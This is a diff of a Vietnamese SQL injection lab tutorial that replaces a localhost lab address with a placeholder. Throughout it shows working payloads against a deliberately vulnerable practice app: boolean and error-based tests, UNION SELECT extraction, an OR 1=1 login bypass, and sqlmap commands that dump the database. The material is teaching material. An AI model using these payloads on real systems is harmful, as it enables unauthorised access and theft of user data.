@@ -68,7 +68,10 @@ SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...'
 ```bash
 cd sqli-basics/lab
 docker compose up -d
-# Lab tại: http://localhost:7104
+
+> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.
+
+# Lab tại: <LAB_ADDRESS>
 ```
 
 Lab là một trang login + trang tìm kiếm sản phẩm, cả hai đều nối chuỗi trực tiếp vào SQL (MySQL).
@@ -80,17 +83,17 @@ Lab là một trang login + trang tìm kiếm sản phẩm, cả hai đều nố
 Thử tìm kiếm sản phẩm bình thường:
 
 ```bash
-$ curl -s "http://localhost:7104/search.php?q=phone"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone"
 ```
 
 Giờ thêm payload — nếu `q=phone' AND 1=1-- -` vẫn hiện kết quả, còn `q=phone' AND 1=2-- -` không hiện → **chắc chắn dính SQLi**:
 
 ```bash
 # Kỳ vọng: hiện sản phẩm phone (AND 1=1 đúng)
-$ curl -s "http://localhost:7104/search.php?q=phone' AND 1=1-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' AND 1=1-- -"
 
 # Kỳ vọng: KHÔNG hiện (AND 1=2 sai)
-$ curl -s "http://localhost:7104/search.php?q=phone' AND 1=2-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' AND 1=2-- -"
 ```
 
 <!-- Output already described via CLI commands above -->
@@ -103,7 +106,7 @@ Khi app hiện lỗi DB, ép nó báo version:
 
 ```bash
 # Ép MySQL báo lỗi kèm version
-$ curl -s "http://localhost:7104/search.php?q=phone' AND extractvalue(1,concat(0x7e,version()))-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' AND extractvalue(1,concat(0x7e,version()))-- -"
 ERROR: XPATH syntax error: '~8.0.35'
 ```
 
@@ -116,10 +119,10 @@ ERROR: XPATH syntax error: '~8.0.35'
 Union cần **đúng số cột**. Thử dần `ORDER BY`:
 
 ```bash
-$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 1-- -"   # ok
-$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 2-- -"   # ok
-$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 3-- -"   # ok
-$ curl -s "http://localhost:7104/search.php?q=phone' ORDER BY 4-- -"   # LỖI → có 3 cột
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' ORDER BY 1-- -"   # ok
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' ORDER BY 2-- -"   # ok
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' ORDER BY 3-- -"   # ok
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' ORDER BY 4-- -"   # LỖI → có 3 cột
 ```
 
 <!-- Output already described via CLI commands above -->
@@ -131,13 +134,13 @@ SELECT id, name, price FROM products WHERE name = 'phone' UNION SELECT 1, 2, 3--
 ```
 
 ```bash
-$ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT 1,2,3-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' UNION SELECT 1,2,3-- -"
 ```
 
 Thấy cột 2 hiển thị số `2` → thay bằng dữ liệu mình muốn. Lấy database name + version:
 
 ```bash
-$ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT database(),version(),3-- -"
+$ curl -s "<LAB_ADDRESS>/search.php?q=phone' UNION SELECT database(),version(),3-- -"
 ```
 
 <!-- Output already described via CLI commands above -->
@@ -149,7 +152,7 @@ $ curl -s "http://localhost:7104/search.php?q=phone' UNION SELECT database(),ver
 Về trang login, đăng nhập không cần mật khẩu:
 
 ```bash
-$ curl -s "http://localhost:7104/login.php" -X POST -d "user=admin' OR 1=1-- -&pass=x"
+$ curl -s "<LAB_ADDRESS>/login.php" -X POST -d "user=admin' OR 1=1-- -&pass=x"
 Welcome admin! FLAG=FLAG{sql1_m4st3r_2026}
 ```
 
@@ -159,9 +162,9 @@ Welcome admin! FLAG=FLAG{sql1_m4st3r_2026}
 
 ```bash
 # Scan & dump toàn bộ database tự động
-sqlmap -u "http://localhost:7104/search.php?q=phone" --batch --dbs
-sqlmap -u "http://localhost:7104/search.php?q=phone" --batch -D lab_db --tables
-sqlmap -u "http://localhost:7104/search.php?q=phone" --batch -D lab_db -T users --dump
+sqlmap -u "<LAB_ADDRESS>/search.php?q=phone" --batch --dbs
+sqlmap -u "<LAB_ADDRESS>/search.php?q=phone" --batch -D lab_db --tables
+sqlmap -u "<LAB_ADDRESS>/search.php?q=phone" --batch -D lab_db -T users --dump
 ```
 
 <!-- Output already described via CLI commands above -->
